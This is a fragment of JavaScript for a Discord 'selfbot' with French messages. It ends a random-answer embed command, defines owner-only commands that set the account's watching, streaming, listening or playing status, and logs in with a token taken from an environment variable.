            .setTitle("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
            .setFooter("© SelfBot by WDS")
            .setThumbnail("https://i.imgur.com/b0deTHt.gif")
            .addField(`Question de ${message.author.tag}`, question)
            .addField("Réponse : ", replies[res])
            message.channel.sendEmbed(bembed);
        }
    
        if ( cmd === prefix + "watch") {
            if (message.author.id != `${ClientID}`) return;

            if (message.deletable) message.delete();
            if (!args[0]) return message.reply("Merci de présicé le nom que tu souhaites.");
    
            let WatchTime = args.slice(0).join(" ");
    
            bot.user.setActivity(`${WatchTime}`, {type: "WATCHING"})
        }
    
        if ( cmd === prefix + "stream") {
            if (message.author.id != `${ClientID}`) return;

            if (message.deletable) message.delete();
            if (!args[0]) return message.reply("Merci de présicé le nom que tu souhaites.");
    
            let StreamTime = args.slice(0).join(" ");
    
            bot.user.setActivity(`${StreamTime}`, {type: "STREAMING", url: 'https://www.twitch.tv/WDS'})
        }
    
        if ( cmd === prefix + "listen") {
            if (message.author.id != `${ClientID}`) return;

            if (message.deletable) message.delete();
            if (!args[0]) return message.reply("Merci de présicé le nom que tu souhaites.");
    
            let ListenTime = args.slice(0).join(" ");
    
            bot.user.setActivity(`${ListenTime}`, {type: "LISTENING"})
        }
        if ( cmd === prefix + "play") {
            if (message.author.id != `${ClientID}`) return;

            if (message.deletable) message.delete();
            if (!args[0]) return message.reply("Merci de présicé le nom que tu souhaites.");
    
            let PlayTime = args.slice(0).join(" ");
    
            bot.user.setActivity(`${PlayTime}`, {type: "PLAYING"})
        }

});

bot.login(process.env.TOKEN);
